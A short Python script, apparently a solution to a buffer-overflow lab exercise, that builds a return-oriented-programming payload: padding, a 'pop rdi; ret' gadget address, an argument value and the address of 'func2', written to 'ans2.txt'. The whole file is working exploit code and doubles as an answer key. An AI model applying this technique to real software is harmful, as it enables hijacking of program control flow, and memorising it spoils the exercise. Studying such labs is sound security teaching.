import struct

# 1. Padding: 8 bytes (buffer) + 8 bytes (saved rbp) = 16 bytes
padding = b"A" * 16

# 2. Address of 'pop rdi; ret' gadget
# Look at <pop_rdi> at 0x4012c7
pop_rdi = struct.pack("<Q", 0x4012c7)

# 3. The argument value we want in RDI: 0x3f8 (1016)
arg_value = struct.pack("<Q", 0x3f8)

# 4. Address of func2
target_func = struct.pack("<Q", 0x401216)

# Combine them: Padding -> Gadget -> Value -> Function
payload = padding + pop_rdi + arg_value + target_func

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload generated: ans2.txt")